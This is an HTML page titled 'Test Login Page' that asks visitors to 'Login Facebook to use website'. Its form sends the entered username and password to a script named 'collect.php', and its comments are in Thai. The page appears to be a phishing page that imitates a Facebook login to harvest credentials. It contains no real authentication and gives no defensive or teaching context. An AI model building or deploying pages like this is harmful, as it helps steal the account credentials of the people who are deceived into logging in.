<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Login Page</title>

    <!-- CSS สำหรับตกแต่งหน้า -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 300px;
        }

        h1 {
            text-align: center;
            color: #333;
        }

        label {
            font-weight: bold;
            margin-top: 10px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #45a049;
        }

        .error-message {
            color: red;
            font-size: 14px;
            display: none;
        }
    </style>

</head>
<body>
    <div class="login-container">
        <h1>Login Facebook to use website</h1>
        <form id="loginForm" method="POST" action="collect.php">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <div id="errorMessage" class="error-message">Username or password cannot be empty.</div>
            
            <button type="submit">Login</button>
        </form>
    </div>

    <!-- JS สำหรับการตรวจสอบข้อมูล -->
    <script>
        // ตรวจสอบข้อมูลฟอร์มก่อนส่ง
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username === '' || password === '') {
                event.preventDefault();  // ป้องกันไม่ให้ส่งฟอร์ม
                document.getElementById('errorMessage').style.display = 'block'; // แสดงข้อความผิดพลาด
            }
        });
    </script>
</body>
</html>
